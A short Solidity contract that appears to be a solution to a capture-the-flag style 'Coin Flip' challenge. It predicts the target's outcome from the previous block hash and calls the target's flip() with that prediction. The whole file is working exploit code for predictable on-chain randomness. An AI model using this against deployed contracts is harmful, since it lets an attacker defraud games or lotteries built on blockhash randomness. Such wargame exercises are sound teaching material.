// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./SafeMath.sol";


interface ICoinPrediction  {
  function flip (bool) external returns (bool);
}


contract CoinFlip {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address cointContract;

  constructor(address _cointContract) {
    cointContract = _cointContract;
  }

  function flipPrediction() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    return ICoinPrediction(cointContract).flip(side);
  }
}